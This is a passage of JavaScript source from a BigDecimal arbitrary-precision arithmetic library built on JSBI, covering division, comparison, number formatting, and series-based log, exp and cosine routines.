            return round(create(JSBI.add(JSBI.lessThan(a.significand, JSBI.BigInt(0)) ? JSBI.unaryMinus(JSBI.BigInt(1)) : JSBI.BigInt(1), bigIntScale(b.significand, rounding.maximumSignificantDigits + 1)), diff(b.exponent, rounding.maximumSignificantDigits + 1)), rounding);
          }

          return round(create(maybeJSBI.add(a.significand, bigIntScale(b.significand, maybeJSBI.unaryMinus(bd))), a.exponent), rounding);
        }
      }

      return round(create(maybeJSBI.add(a.significand, b.significand), a.exponent), rounding);
    };

    BigDecimal.subtract = function (a, b, rounding) {
      rounding = rounding == undefined ? null : rounding;
      return BigDecimal.add(a, BigDecimal.unaryMinus(b), rounding);
    };

    BigDecimal.multiply = function (a, b, rounding) {
      rounding = rounding == undefined ? null : rounding;
      return normalize(round(create(maybeJSBI.multiply(a.significand, b.significand), sum(a.exponent, b.exponent)), rounding), rounding);
    };

    function bigIntScale(a, scaling) {
      return BASE === 2 ? maybeJSBI.leftShift(a, cachedBigInt(scaling)) : maybeJSBI.multiply(cachedPower(scaling), a);
    }

    function bigIntUnscale(a, unscaling) {
      return BASE === 2 ? maybeJSBI.signedRightShift(a, cachedBigInt(unscaling)) : maybeJSBI.divide(a, cachedPower(unscaling));
    }

    BigDecimal.divide = function (a, b, rounding) {
      rounding = rounding == undefined ? null : rounding;

      if (JSBI.equal(a.significand, JSBI.BigInt(0))) {
        return a;
      }

      var exponent = diff(a.exponent, b.exponent);
      var scaling = 0;

      if (rounding != null && rounding.maximumSignificantDigits != null) {
        scaling = rounding.maximumSignificantDigits + (digits(b.significand) - digits(a.significand));
      } else if (rounding != null && rounding.maximumFractionDigits != null) {
        //scaling = BigInt(rounding.maximumFractionDigits) + bigIntMax(a.exponent, 0n) + bigIntMax(0n - b.exponent, 0n) - bigIntMin(a.exponent - b.exponent + BigInt(digits(a.significand) - digits(b.significand)), 0n);
        scaling = sum(rounding.maximumFractionDigits, exponent);
      } else {
        // Try to do exact division:
        scaling = Math.ceil(digits(b.significand) * Math.log2(BASE)) + 1;
      }

      var dividend = scaling > 0 ? bigIntScale(a.significand, scaling) : a.significand;
      var divisor = scaling < 0 ? bigIntScale(b.significand, maybeJSBI.unaryMinus(scaling)) : b.significand;

      if (JSBI.lessThan(divisor, JSBI.BigInt(0))) {
        dividend = maybeJSBI.unaryMinus(dividend);
        divisor = maybeJSBI.unaryMinus(divisor);
      }

      var quotient = JSBI.BigInt(0);

      if (rounding != null && rounding.roundingMode === "floor") {
        if (JSBI.greaterThanOrEqual(dividend, JSBI.BigInt(0))) {
          quotient = maybeJSBI.divide(dividend, divisor);
        } else {
          quotient = JSBI.subtract(JSBI.divide(JSBI.add(dividend, JSBI.BigInt(1)), divisor), JSBI.BigInt(1));
        }
      } else if (rounding != null && rounding.roundingMode === "ceil") {
        if (JSBI.lessThanOrEqual(dividend, JSBI.BigInt(0))) {
          quotient = maybeJSBI.divide(dividend, divisor);
        } else {
          quotient = JSBI.add(JSBI.divide(JSBI.subtract(dividend, JSBI.BigInt(1)), divisor), JSBI.BigInt(1));
        }
      } else {
        if (JSBI.lessThan(dividend, JSBI.BigInt(0))) {
          quotient = JSBI.subtract(JSBI.divide(JSBI.add(dividend, JSBI.BigInt(1)), divisor), JSBI.BigInt(1));
        } else {
          quotient = maybeJSBI.divide(dividend, divisor);
        }

        var remainder = maybeJSBI.subtract(dividend, maybeJSBI.multiply(divisor, quotient));
        console.assert(JSBI.greaterThanOrEqual(remainder, JSBI.BigInt(0)));

        if (JSBI.notEqual(remainder, JSBI.BigInt(0))) {
          if (rounding == null) {
            throw new RangeError("rounding is not given for inexact operation");
          }

          quotient = JSBI.multiply(quotient, JSBI.exponentiate(BIGINT_BASE, JSBI.BigInt(2)));
          scaling = sum(scaling, 2);

          if (JSBI.lessThan(JSBI.multiply(remainder, JSBI.BigInt(2)), divisor)) {
            quotient = JSBI.add(quotient, JSBI.BigInt(1));
          } else if (JSBI.equal(JSBI.multiply(remainder, JSBI.BigInt(2)), divisor)) {
            quotient = JSBI.add(quotient, JSBI.divide(JSBI.exponentiate(BIGINT_BASE, JSBI.BigInt(2)), JSBI.BigInt(2)));
          } else {
            quotient = JSBI.add(quotient, JSBI.add(JSBI.divide(JSBI.exponentiate(BIGINT_BASE, JSBI.BigInt(2)), JSBI.BigInt(2)), JSBI.BigInt(1)));
          }
        }
      }

      return round(create(quotient, diff(exponent, scaling)), rounding);
    };

    function compare(a, b) {
      if (maybeJSBI.equal(a.exponent, b.exponent)) {
        return maybeJSBI.lessThan(a.significand, b.significand) ? -1 : maybeJSBI.greaterThan(a.significand, b.significand) ? +1 : 0;
      }

      if (JSBI.lessThanOrEqual(a.significand, JSBI.BigInt(0)) && JSBI.greaterThanOrEqual(b.significand, JSBI.BigInt(0))) {
        return !(JSBI.equal(a.significand, JSBI.BigInt(0)) && JSBI.equal(b.significand, JSBI.BigInt(0))) ? -1 : 0;
      }

      if (JSBI.greaterThanOrEqual(a.significand, JSBI.BigInt(0)) && JSBI.lessThanOrEqual(b.significand, JSBI.BigInt(0))) {
        return JSBI.equal(a.significand, JSBI.BigInt(0)) && JSBI.equal(b.significand, JSBI.BigInt(0)) ? 0 : +1;
      }

      if (BASE !== 2) {
        var differenceOfLogarithms = maybeJSBI.toNumber(sum(diff(a.exponent, b.exponent), digits(a.significand) - digits(b.significand)));

        if (differenceOfLogarithms !== 0) {
          return JSBI.lessThan(a.significand, JSBI.BigInt(0)) && JSBI.lessThan(b.significand, JSBI.BigInt(0)) ? differenceOfLogarithms > 0 ? -1 : +1 : differenceOfLogarithms < 0 ? -1 : +1;
        }
      } else {
        //TODO: remove when bitLength is fast
        var x = maybeJSBI.greaterThanOrEqual(a.exponent, b.exponent) ? a.significand : maybeJSBI.signedRightShift(a.significand, cachedBigInt(diff(b.exponent, a.exponent)));
        var y = maybeJSBI.greaterThanOrEqual(b.exponent, a.exponent) ? b.significand : maybeJSBI.signedRightShift(b.significand, cachedBigInt(diff(a.exponent, b.exponent)));

        if (maybeJSBI.lessThan(x, y)) {
          return -1;
        }

        if (maybeJSBI.lessThan(y, x)) {
          return +1;
        } //return x < y ? -1 : (x > y ? +1 : 0);

      }

      var x = maybeJSBI.lessThanOrEqual(a.exponent, b.exponent) ? a.significand : bigIntScale(a.significand, diff(a.exponent, b.exponent));
      var y = maybeJSBI.lessThanOrEqual(b.exponent, a.exponent) ? b.significand : bigIntScale(b.significand, diff(b.exponent, a.exponent));
      return maybeJSBI.lessThan(x, y) ? -1 : maybeJSBI.greaterThan(x, y) ? +1 : 0;
    }

    BigDecimal.lessThan = function (a, b) {
      return compare(a, b) < 0;
    };

    BigDecimal.greaterThan = function (a, b) {
      return compare(a, b) > 0;
    };

    BigDecimal.equal = function (a, b) {
      return compare(a, b) === 0;
    };

    BigDecimal.round = function (a, rounding) {
      //TODO: quick round algorithm (?)
      return round(a, rounding);
    };

    BigDecimal.prototype.toString = function () {
      //! https://tc39.es/ecma262/#sec-number.prototype.tostring
      if (BASE !== 10) {
        throw new Error();
      }

      if (arguments.length !== 0) {
        throw new RangeError("not implemented");
      }

      var x = BigDecimal.BigDecimal(this); //! https://tc39.es/ecma262/#sec-numeric-types-number-tostring

      if (BigDecimal.equal(x, BigDecimal.BigDecimal(0))) {
        return "0";
      }

      var sign = "";

      if (BigDecimal.lessThan(x, BigDecimal.BigDecimal(0))) {
        x = BigDecimal.unaryMinus(x);
        sign = "-";
      }

      var getSignificand = function (a, log10) {
        //var s = BigDecimal.multiply(exponentiate(10, -log10), a);
        //var m = BigDecimal.BigDecimal(Math.pow(10, 15));
        //while (!BigDecimal.equal(BigDecimal.round(BigDecimal.multiply(s, m), {maximumFractionDigits: 0, roundingMode: "half-even"}), BigDecimal.multiply(s, m))) {
        //  m = BigDecimal.multiply(m, m);
        //}
        //return BigDecimal.toBigInt(BigDecimal.multiply(s, m)).toString().replace(/0+$/g, "") || "0";
        return a.significand.toString().replace(/0+$/g, "") || "0";
      };

      var e = getCountOfDigits(x);
      var significand = getSignificand(x, e);

      if (!BigDecimal.greaterThan(exponentiate(10, JSBI.unaryMinus(JSBI.BigInt(6))), x) && BigDecimal.lessThan(x, exponentiate(10, JSBI.BigInt(21)))) {
        return sign + bigDecimalToPlainString(significand, JSBI.toNumber(JSBI.subtract(e, JSBI.BigInt(significand.length))), 0, 0);
      }

      return sign + bigDecimalToPlainString(significand, -(significand.length - 1), 0, 0) + "e" + (JSBI.greaterThanOrEqual(JSBI.subtract(e, JSBI.BigInt(1)), JSBI.BigInt(0)) ? "+" : "") + JSBI.subtract(e, JSBI.BigInt(1)).toString();
    };

    function bigDecimalToPlainString(significand, exponent, minFraction, minSignificant) {
      var e = maybeJSBI.add(exponent, significand.length) - 1;
      var i = significand.length - 1;

      while (i >= 0 && maybeJSBI.equal(significand.charCodeAt(i), "0".charCodeAt(0))) {
        i -= 1;
      }

      significand = significand.slice(0, i + 1);
      var zeros = Math.max(0, Math.max(e + 1, minSignificant) - significand.length);

      if (e <= -1) {
        significand = maybeJSBI.add("0".repeat(0 - e), significand);
        e = 0;
      }

      significand = maybeJSBI.add(significand, "0".repeat(zeros));
      significand = maybeJSBI.add(significand, "0".repeat(Math.max(minFraction - (significand.length - (e + 1)), 0)));
      return significand.slice(0, e + 1) + (significand.length > e + 1 ? "." + significand.slice(e + 1) : "");
    } // Something like Number#toPrecision: when value is between 10**-6 and Math.pow(10, p)? - to fixed, otherwise - to exponential:


    function toPrecision(significand, exponent, minSignificant) {
      var e = JSBI.add(exponent, JSBI.BigInt(significand.length - 1));

      if (JSBI.lessThan(e, JSBI.unaryMinus(JSBI.BigInt(6))) || JSBI.greaterThanOrEqual(e, JSBI.BigInt(minSignificant))) {
        return bigDecimalToPlainString(significand, -(significand.length - 1), 0, minSignificant) + "e" + (JSBI.lessThan(e, JSBI.BigInt(0)) ? "-" : "+") + bigIntAbs(e).toString();
      }

      return bigDecimalToPlainString(significand, maybeJSBI.toNumber(exponent), 0, minSignificant);
    }

    function toFixed(significand, exponent, minFraction) {
      return bigDecimalToPlainString(significand, exponent, minFraction, 0);
    }

    function toExponential(significand, exponent, minFraction) {
      var e = JSBI.add(exponent, JSBI.BigInt(significand.length - 1));
      return bigDecimalToPlainString(significand, -(significand.length - 1), 0, minFraction + 1) + "e" + (JSBI.lessThan(e, JSBI.BigInt(0)) ? "-" : "+") + bigIntAbs(e).toString();
    }

    BigDecimal.prototype.toFixed = function (fractionDigits, roundingMode) {
      roundingMode = roundingMode == undefined ? "half-up" : roundingMode;
      var value = BigDecimal.multiply(BigDecimal.BigDecimal(JSBI.exponentiate(JSBI.BigInt(10), JSBI.BigInt(fractionDigits))), this);
      var sign = BigDecimal.lessThan(value, BigDecimal.BigDecimal(0)) ? "-" : "";
      var rounded = BigDecimal.round(value, {
        maximumFractionDigits: 0,
        roundingMode: roundingMode
      });
      var a = BigDecimal.abs(rounded);
      return sign + toFixed(BigDecimal.toBigInt(a).toString(), maybeJSBI.unaryMinus(fractionDigits), fractionDigits);
    };

    function getDecimalSignificantAndExponent(value, precision, roundingMode) {
      //TODO: fix performance, test
      var exponentiate = function (x, n, rounding) {
        if (JSBI.lessThan(n, JSBI.BigInt(0))) {
          return BigDecimal.divide(BigDecimal.BigDecimal(1), exponentiate(x, maybeJSBI.unaryMinus(n), rounding), rounding);
        }

        var y = undefined;

        while (JSBI.greaterThanOrEqual(n, JSBI.BigInt(1))) {
          if (JSBI.equal(JSBI.remainder(n, JSBI.BigInt(2)), JSBI.BigInt(0))) {
            x = BigDecimal.multiply(x, x, rounding);
            n = JSBI.divide(n, JSBI.BigInt(2));
          } else {
            y = y == undefined ? x : BigDecimal.multiply(x, y, rounding);
            n = JSBI.subtract(n, JSBI.BigInt(1));
          }
        }

        return y == undefined ? BigDecimal.BigDecimal(1) : y;
      };

      var logarithm = function (x, b, rounding) {
        if (!BigDecimal.greaterThan(x, BigDecimal.BigDecimal(0))) {
          throw new RangeError();
        }

        if (BigDecimal.lessThan(x, BigDecimal.BigDecimal(1))) {
          return maybeJSBI.unaryMinus(logarithm(BigDecimal.divide(BigDecimal.BigDecimal(1), x, rounding), b, rounding));
        }

        var digits = getCountOfDigits(x);
        var v = JSBI.BigInt(bitLength(digits) - Math.floor(Math.log2(Number.MAX_SAFE_INTEGER + 1)));
        var log = JSBI.leftShift(JSBI.BigInt(Math.floor(JSBI.toNumber(JSBI.signedRightShift(digits, v)) / Math.log2(b) * Math.log2(BASE))), v);
        /*var ten = BigDecimal.BigDecimal(10);
        var b = 1n;
        while (!BigDecimal.lessThan(x, exponentiate(ten, b, rounding))) {
          b *= 2n;
        }
        var e = 0n;
        while (b >= 1n) {
          var u = exponentiate(ten, b, rounding);
          if (!BigDecimal.lessThan(x, u)) {
            e += b;
            x = BigDecimal.divide(x, u, rounding);
          }
          b /= 2n;
        }
        return e;*/

        if (JSBI.lessThan(log, JSBI.BigInt(3))) {
          return log;
        }

        return JSBI.add(log, logarithm(BigDecimal.divide(x, exponentiate(BigDecimal.BigDecimal(b), log, rounding), rounding), b, rounding));
      };

      var sign = BigDecimal.lessThan(value, BigDecimal.BigDecimal(0)) ? -1 : +1;

      var roundToInteger = function (a) {
        if (BigDecimal.greaterThan(a, BigDecimal.BigDecimal(0)) && BigDecimal.lessThan(a, BigDecimal.BigDecimal(1)) && BigDecimal.greaterThan(BigDecimal.multiply(BigDecimal.subtract(BigDecimal.BigDecimal(1), a), BigDecimal.BigDecimal(2 * 10)), BigDecimal.BigDecimal(1))) {
          return BigDecimal.BigDecimal(0);
        }

        return BigDecimal.round(sign >= 0 ? a : BigDecimal.unaryMinus(a), {
          maximumFractionDigits: 0,
          roundingMode: roundingMode
        });
      };

      if (BigDecimal.equal(value, BigDecimal.BigDecimal(0))) {
        return {
          significand: "0",
          exponent: JSBI.BigInt(0)
        };
      }

      var ten = BigDecimal.BigDecimal(10);
      var minimumSignificantDigits = Math.pow(2, Math.ceil(Math.log2(bitLength(JSBI.add(bigIntAbs(JSBI.BigInt(value.exponent)), JSBI.BigInt(1))) / Math.log2(BASE))));
      var rounding = {
        maximumSignificantDigits: Math.max(minimumSignificantDigits, 8),
        roundingMode: "half-even"
      };
      var result = undefined;
      var fd = JSBI.BigInt(0);

      do {
        var x = BigDecimal.abs(value);
        fd = JSBI.subtract(JSBI.BigInt(0), logarithm(x, 10, rounding));
        x = BigDecimal.multiply(exponentiate(ten, fd, rounding), x, rounding);

        if (!BigDecimal.lessThan(x, ten)) {
          fd = JSBI.subtract(fd, JSBI.BigInt(1));
          x = BigDecimal.divide(x, ten, rounding);
        }

        if (BigDecimal.lessThan(x, BigDecimal.BigDecimal(1))) {
          fd = JSBI.add(fd, JSBI.BigInt(1));
          x = BigDecimal.multiply(x, ten, rounding);
        }

        if (!BigDecimal.lessThan(x, BigDecimal.BigDecimal(1)) && BigDecimal.lessThan(x, ten)) {
          fd = JSBI.subtract(fd, JSBI.BigInt(1));
          fd = JSBI.add(fd, JSBI.BigInt(precision));
          x = BigDecimal.multiply(exponentiate(ten, fd, rounding), value, rounding);
          x = BigDecimal.abs(x); //x = BigDecimal.multiply(x, exponentiate(ten, BigInt(precision - 1), rounding), rounding);

          var error = BigDecimal.multiply(BigDecimal.multiply(BigDecimal.BigDecimal(JSBI.add(bigIntAbs(fd), JSBI.BigInt(precision))), exponentiate(BigDecimal.BigDecimal(BASE), JSBI.unaryMinus(JSBI.BigInt(rounding.maximumSignificantDigits)))), x); //TODO: ?

          if (rounding.maximumSignificantDigits > (Math.abs(JSBI.toNumber(fd)) + precision) * Math.log2(10) + digits(value.significand) || BigDecimal.equal(roundToInteger(BigDecimal.add(x, error)), roundToInteger(BigDecimal.subtract(x, error)))) {
            result = BigDecimal.toBigInt(BigDecimal.abs(roundToInteger(x))).toString();
          }
        }

        rounding = {
          maximumSignificantDigits: rounding.maximumSignificantDigits * 2,
          roundingMode: "half-even"
        };
      } while (result == undefined);

      return {
        significand: result,
        exponent: JSBI.unaryMinus(fd)
      };
    }

    BigDecimal.prototype.toPrecision = function (precision, roundingMode) {
      roundingMode = roundingMode == undefined ? "half-up" : roundingMode;
      var tmp = getDecimalSignificantAndExponent(this, precision, roundingMode);
      return (BigDecimal.lessThan(this, BigDecimal.BigDecimal(0)) ? "-" : "") + toPrecision(tmp.significand, tmp.exponent, precision);
    };

    BigDecimal.prototype.toExponential = function (fractionDigits, roundingMode) {
      roundingMode = roundingMode == undefined ? "half-up" : roundingMode;
      var tmp = getDecimalSignificantAndExponent(this, fractionDigits + 1, roundingMode);
      return (BigDecimal.lessThan(this, BigDecimal.BigDecimal(0)) ? "-" : "") + toExponential(tmp.significand, tmp.exponent, fractionDigits);
    };

    function exponentiate(a, n) {
      if (maybeJSBI.notEqual(a, BASE)) {
        throw new RangeError("a should be BASE"); //?
      }

      return create(JSBI.BigInt(1), n);
    }

    function getCountOfDigits(a) {
      // floor(log(abs(a))/log(BASE)) + 1
      if (JSBI.equal(a.significand, JSBI.BigInt(0))) {
        throw new RangeError();
      }

      return JSBI.add(JSBI.BigInt(digits(a.significand)), JSBI.BigInt(a.exponent));
    }

    BigDecimal.abs = function (a) {
      return BigDecimal.lessThan(a, BigDecimal.BigDecimal(0)) ? BigDecimal.unaryMinus(a) : a;
    };

    BigDecimal.sign = function (a) {
      var zero = BigDecimal.BigDecimal(0);
      return BigDecimal.lessThan(a, zero) ? -1 : BigDecimal.greaterThan(a, zero) ? +1 : 0;
    };

    BigDecimal.max = function (a, b) {
      if (arguments.length > 2) {
        throw new RangeError("not implemented");
      }

      return BigDecimal.lessThan(a, b) ? b : a;
    };

    BigDecimal.min = function (a, b) {
      if (arguments.length > 2) {
        throw new RangeError("not implemented");
      }

      return BigDecimal.greaterThan(a, b) ? b : a;
    };

    function significandDigits(a) {
      var maximumSignificantDigits = 1;

      while (!BigDecimal.equal(BigDecimal.round(a, {
        maximumSignificantDigits: maximumSignificantDigits,
        roundingMode: "half-even"
      }), a)) {
        maximumSignificantDigits *= 2;
      }

      var from = maximumSignificantDigits / 2;
      var to = maximumSignificantDigits;

      while (to - 1 > from) {
        var middle = from + Math.floor((to - from) / 2);

        if (!BigDecimal.equal(BigDecimal.round(a, {
          maximumSignificantDigits: middle,
          roundingMode: "half-even"
        }), a)) {
          from = middle;
        } else {
          to = middle;
        }
      }

      return to;
    }

    function getExponent(number) {
      var e = Math.floor(Math.log(Math.abs(number)) / Math.log(2)) - 1;
      return Math.abs(number) / Math.pow(2, e) >= 2 ? e + 1 : e;
    }

    function tryToMakeCorrectlyRounded(specialValue, f, name) {
      function getExpectedResultIntegerDigits(x) {
        if (name === "exp") {
          // e**x <= Math.pow(BASE, k)
          // k >= x / log(BASE)
          return Math.ceil(maybeJSBI.toNumber(BigDecimal.toBigInt(BigDecimal.round(x, {
            maximumFractionDigits: 0,
            roundingMode: "half-even"
          }))) / Math.log(BASE));
        }

        if (name === "log") {
          // log(x) <= Math.pow(BASE, k)
          // log(log(x))/log(BASE) <= k
          return Math.ceil(Math.log2(Math.ceil(Math.max(JSBI.toNumber(getCountOfDigits(x)), 1) * Math.log(BASE))) / Math.log2(BASE));
        }

        return 1;
      } // (?) https://en.wikipedia.org/wiki/Rounding#Table-maker's_dilemma


      return function (x, rounding) {
        if (BigDecimal.equal(x, BigDecimal.BigDecimal(specialValue))) {
          return f(x, {
            maximumSignificantDigits: 1,
            roundingMode: "half-even"
          });
        }

        var result = BigDecimal.BigDecimal(0);
        var i = 0;
        var error = BigDecimal.BigDecimal(0);

        do {
          if (i > 4 * ((9 + 1) / BASE) && rounding.maximumSignificantDigits != null && rounding.roundingMode === "half-even" && name !== "sin" && name !== "cos") {
            console.error(x, rounding);
            throw new Error();
          }

          i += 1;
          var internalRounding = {
            maximumSignificantDigits: Math.ceil(Math.max(rounding.maximumSignificantDigits || rounding.maximumFractionDigits + 1 + getExpectedResultIntegerDigits(x) - 1, significandDigits(x)) * Math.pow(2, Math.ceil((i - 1) / 3))) + 2 + (BASE === 2 ? 1 : 0),
            roundingMode: "half-even"
          };
          result = undefined;

          if (Math.max(internalRounding.maximumSignificantDigits + 2, significandDigits(x) + 1) <= Math.log2(Number.MAX_SAFE_INTEGER + 1) && BASE === 2) {
            // Hm... https://www.gnu.org/software/libc/manual/html_node/Errors-in-Math-Functions.html
            var exponent = maybeJSBI.toNumber(x.exponent);
            var v = maybeJSBI.toNumber(x.significand) * Math.pow(BASE, exponent); // some browsers have inaccurate results for Math.sin, Math.cos, Math.tan outside of [-pi/4;pi/4] range

            if (name !== "sin" && name !== "cos" && name !== "tan" || Math.abs(v) <= Math.PI / 4) {
              var numberValue = Math[name](v);
              var MIN_NORMALIZED_VALUE = (Number.MIN_VALUE * 1.25 > Number.MIN_VALUE ? Number.MIN_VALUE : Number.MIN_VALUE * (Number.MAX_SAFE_INTEGER + 1) / 2) || Math.pow(2, -1022);
              var a = Math.abs(numberValue);

              if (a < 1 / 0 && a > MIN_NORMALIZED_VALUE) {
                result = BigDecimal.BigDecimal(numberValue);
              }
            }
          }

          if (result == undefined) {
            result = f(x, internalRounding);
          } // round(result - error) === round(result + error)


          error = BigDecimal.multiply(exponentiate(BASE, JSBI.unaryMinus(JSBI.BigInt(internalRounding.maximumSignificantDigits))), BigDecimal.abs(result)); //if (i > 0) {
          //console.log(i, f.name, x + "", result + "", error + "", BigDecimal.round(BigDecimal.subtract(result, error), rounding) + "", BigDecimal.round(BigDecimal.add(result, error), rounding) + "");
          //}
        } while (!BigDecimal.equal(BigDecimal.round(BigDecimal.subtract(result, error), rounding), BigDecimal.round(BigDecimal.add(result, error), rounding)));

        if (i > 1) {//console.debug(i, name);
        }

        return BigDecimal.round(result, rounding);
      };
    }

    function sqrt(x, rounding) {
      // from https://en.wikipedia.org/wiki/Square_root#Computation
      var lastResult = BigDecimal.add(x, BigDecimal.BigDecimal(1));
      var result = x;

      while (BigDecimal.lessThan(result, lastResult)) {
        lastResult = result;
        result = BigDecimal.divide(BigDecimal.add(BigDecimal.divide(x, result, rounding), result), BigDecimal.BigDecimal(2), rounding);
      }

      return result;
    }

    BigDecimal.log = tryToMakeCorrectlyRounded(1, function log(x, rounding) {
      if (!BigDecimal.greaterThan(x, BigDecimal.BigDecimal(0))) {
        throw new RangeError();
      } // https://ru.wikipedia.org/wiki/Ð›Ð¾Ð³Ð°Ñ€Ð¸Ñ„Ð¼#Ð Ð°Ð·Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ_Ð²_Ñ€ÑÐ´_Ð¸_Ð²Ñ‹Ñ‡Ð¸ÑÐ»ÐµÐ½Ð¸Ðµ_Ð½Ð°Ñ‚ÑƒÑ€Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾_Ð»Ð¾Ð³Ð°Ñ€Ð¸Ñ„Ð¼Ð°


      var internalRounding = {
        maximumSignificantDigits: rounding.maximumSignificantDigits + Math.ceil(Math.log2(rounding.maximumSignificantDigits + 0.5) / Math.log2(BASE)),
        roundingMode: "half-even"
      };

      if (true) {
        //! ln(f * Math.pow(BASE, k)) = ln(f) + k * ln(BASE), where (1/BASE) <= f <= BASE
        var k = JSBI.subtract(getCountOfDigits(x), JSBI.BigInt(1));
        var f = BigDecimal.multiply(exponentiate(BASE, JSBI.unaryMinus(k)), x);
        var ff = BigDecimal.round(BigDecimal.multiply(f, f), {
          maximumSignificantDigits: 3,
          roundingMode: "half-even"
        });

        if (BigDecimal.greaterThan(ff, exponentiate(BASE, JSBI.BigInt(1)))) {
          k = JSBI.add(k, JSBI.BigInt(1));
          f = BigDecimal.multiply(exponentiate(BASE, JSBI.unaryMinus(JSBI.BigInt(1))), f);
        }

        if (BigDecimal.lessThan(ff, exponentiate(BASE, JSBI.unaryMinus(JSBI.BigInt(1))))) {
          k = JSBI.subtract(k, JSBI.BigInt(1));
          f = BigDecimal.multiply(exponentiate(BASE, JSBI.BigInt(1)), f);
        }

        if (JSBI.notEqual(k, JSBI.BigInt(0))) {
          return BigDecimal.add(BigDecimal.log(f, internalRounding), BigDecimal.multiply(BigDecimal.BigDecimal(JSBI.multiply(JSBI.BigInt(2), k)), BigDecimal.log(sqrt(BigDecimal.BigDecimal(BASE), internalRounding), internalRounding)));
        }
      } //! log(x) = log((1 + g) / (1 - g)) = 2*(g + g**3/3 + g**5/5 + ...)


      var g = BigDecimal.divide(BigDecimal.subtract(x, BigDecimal.BigDecimal(1)), BigDecimal.add(x, BigDecimal.BigDecimal(1)), internalRounding);
      var n = 1;
      var term = BigDecimal.BigDecimal(1);
      var sum = term;
      var lastSum = BigDecimal.BigDecimal(0);
      var gg = BigDecimal.multiply(g, g, internalRounding);

      while (!BigDecimal.equal(lastSum, sum)) {
        n += 2;
        term = BigDecimal.multiply(term, BigDecimal.BigDecimal(n - 2));
        term = BigDecimal.multiply(term, gg);
        term = BigDecimal.divide(term, BigDecimal.BigDecimal(n), internalRounding);
        lastSum = sum;
        sum = BigDecimal.add(sum, term, internalRounding);
      }

      return BigDecimal.multiply(BigDecimal.multiply(BigDecimal.BigDecimal(2), g), sum);
    }, "log");

    function fromNumberApproximate(number) {
      return BigDecimal.divide(BigDecimal.BigDecimal(Math.floor(number * (Number.MAX_SAFE_INTEGER + 1))), BigDecimal.add(BigDecimal.BigDecimal(Number.MAX_SAFE_INTEGER), BigDecimal.BigDecimal(1)), {
        maximumSignificantDigits: Math.floor(Math.log2(Number.MAX_SAFE_INTEGER + 1) / Math.log2(BASE) + 0.5),
        roundingMode: "half-even"
      });
    }

    BigDecimal.exp = tryToMakeCorrectlyRounded(0, function exp(x, rounding) {
      //! k = round(x / ln(BASE));
      //! exp(x) = exp(x - k * ln(BASE) + k * ln(BASE)) = exp(x - k * ln(BASE)) * BASE**k
      var internalRounding = {
        maximumSignificantDigits: rounding.maximumSignificantDigits + Math.ceil(Math.log2(rounding.maximumSignificantDigits + 0.5) / Math.log2(BASE)),
        roundingMode: "half-even"
      };

      if (!BigDecimal.equal(x, BigDecimal.BigDecimal(0))) {
        var logBASEApproximate = fromNumberApproximate(Math.log(BASE));
        var kApproximate = BigDecimal.round(BigDecimal.divide(x, logBASEApproximate, {
          maximumSignificantDigits: Math.max(JSBI.toNumber(getCountOfDigits(x)), 1),
          roundingMode: "half-even"
        }), {
          maximumFractionDigits: 0,
          roundingMode: "half-even"
        });

        if (!BigDecimal.equal(kApproximate, BigDecimal.BigDecimal(0))) {
          var logBASE = BigDecimal.log(BigDecimal.BigDecimal(BASE), {
            maximumSignificantDigits: internalRounding.maximumSignificantDigits + JSBI.toNumber(getCountOfDigits(kApproximate)),
            roundingMode: "half-even"
          });
          var k = BigDecimal.round(BigDecimal.divide(x, logBASE, {
            maximumSignificantDigits: Math.max(JSBI.toNumber(getCountOfDigits(x)), 1),
            roundingMode: "half-even"
          }), {
            maximumFractionDigits: 0,
            roundingMode: "half-even"
          });

          if (!BigDecimal.equal(k, BigDecimal.BigDecimal(0))) {
            var r = BigDecimal.subtract(x, BigDecimal.multiply(k, logBASE));
            return BigDecimal.multiply(exponentiate(BASE, BigDecimal.toBigInt(k)), BigDecimal.exp(r, internalRounding));
          }
        }
      } // https://en.wikipedia.org/wiki/Exponential_function#Computation


      var n = 0;
      var term = BigDecimal.BigDecimal(1);
      var sum = term;
      var lastSum = BigDecimal.BigDecimal(0);

      while (!BigDecimal.equal(lastSum, sum)) {
        n += 1;
        term = BigDecimal.multiply(term, x);
        term = BigDecimal.divide(term, BigDecimal.BigDecimal(n), internalRounding);
        lastSum = sum;
        sum = BigDecimal.add(sum, term, internalRounding);
      }

      return sum;
    }, "exp");

    function divideByHalfOfPI(x, rounding) {
      // x = k*pi/2 + r + 2*pi*n, where |r| < pi/4
      var quarterOfPiApproximated = fromNumberApproximate(Math.PI / 4);

      if (BigDecimal.greaterThan(BigDecimal.abs(x), quarterOfPiApproximated)) {
        //TODO: FIX
        var internalRounding = {
          maximumSignificantDigits: rounding.maximumSignificantDigits + significandDigits(x) + JSBI.toNumber(getCountOfDigits(x)) + 1 + Math.ceil(42 / Math.log2(BASE)),
          roundingMode: "half-even"
        };
        var halfOfPi = BigDecimal.multiply(BigDecimal.BigDecimal(2), BigDecimal.atan(BigDecimal.BigDecimal(1), internalRounding));
        var i = BigDecimal.round(BigDecimal.divide(x, halfOfPi, {
          maximumSignificantDigits: Math.max(JSBI.toNumber(getCountOfDigits(x)), 1),
          roundingMode: "half-even"
        }), {
          maximumFractionDigits: 0,
          roundingMode: "half-even"
        });
        var remainder = BigDecimal.subtract(x, BigDecimal.multiply(i, halfOfPi));
        return {
          remainder: remainder,
          k: (JSBI.toNumber(JSBI.remainder(BigDecimal.toBigInt(i), JSBI.BigInt(4))) + 4) % 4
        };
      }

      return {
        remainder: x,
        k: 0
      };
    }

    function _cos(x, rounding, subtractHalfOfPi) {
      var tmp = divideByHalfOfPI(x, rounding);
      var a = tmp.remainder;
      var k = (tmp.k + (subtractHalfOfPi ? -1 + 4 : 0)) % 4; // https://en.wikipedia.org/wiki/Lookup_table#Computing_sines
      // https://en.wikipedia.org/wiki/Trigonometric_functions#Power_series_expansion

      var internalRounding = {
        maximumSignificantDigits: rounding.maximumSignificantDigits + Math.ceil(Math.log2(rounding.maximumSignificantDigits + 0.5) / Math.log2(BASE)),
        roundingMode: "half-even"
      };
      var n = k === 1 || k === 3 ? 1 : 0;
      var term = BigDecimal.BigDecimal(1);
      var sum = term;
      var lastSum = BigDecimal.BigDecimal(0);
      var aa = BigDecimal.multiply(a, a);

      while (!BigDecimal.equal(lastSum, sum)) {
        n += 2;
        term = BigDecimal.multiply(term, aa);
        term = BigDecimal.divide(term, BigDecimal.BigDecimal(-n * (n - 1)), internalRounding);
        lastSum = sum;
        sum = BigDecimal.add(sum, term, internalRounding);
      }

